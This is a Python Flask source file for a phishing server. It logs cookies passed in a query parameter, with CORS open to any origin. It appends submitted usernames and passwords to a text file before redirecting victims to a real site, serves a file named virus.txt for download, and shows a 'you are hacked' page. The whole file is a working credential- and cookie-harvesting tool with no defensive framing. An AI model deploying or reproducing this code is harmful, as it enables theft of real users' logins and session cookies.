from flask import Flask, render_template, request, url_for,redirect,send_file
from werkzeug.exceptions import RequestEntityTooLarge
from werkzeug.utils import redirect
from flask_cors import CORS



app = Flask(__name__)
cors = CORS(app, resources={r"*": {"origins": "*"}})

@app.route("/")
def index():
    print(request.form)
    cookie = request.args.get('cookie')
    print(cookie)
    # response.headers.add("Access-Control-Allow-Origin", "*")
    return render_template('index.html') 


@app.route("/login", methods = ['GET', 'POST'])
def login():
    username = request.form.get("username")
    password = request.form.get("password")
    info = f"Username: {username} <<<<----->>>>> Passowrd: {password}"
    myfile = open('UsersAndPassowrds.txt', 'a')
    myfile.write(str(info + "\n"))
    myfile.close()
    print(info)

   
    # Set the url where you want to be redirected when username and password are entere
    return redirect("URL TO THE WEBSITE")


@app.route("/login2", methods = ['GET', 'POST'])
def loginHacked():
    username = request.form.get("username")
    password = request.form.get("password")

    info = f"Username {username} <<<<----->>>>> {password}"
    print(info)
    return render_template('URHacked.html') 


@app.route("/virus", methods = ['GET'])
def txtMalware():
    # Set Full path to the file
    return send_file(r'./virus.txt',as_attachment=True) 

@app.route("/YouAreHacked", methods = ['GET'])
def URHacked():
   
   return render_template('URHacked.html') 

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)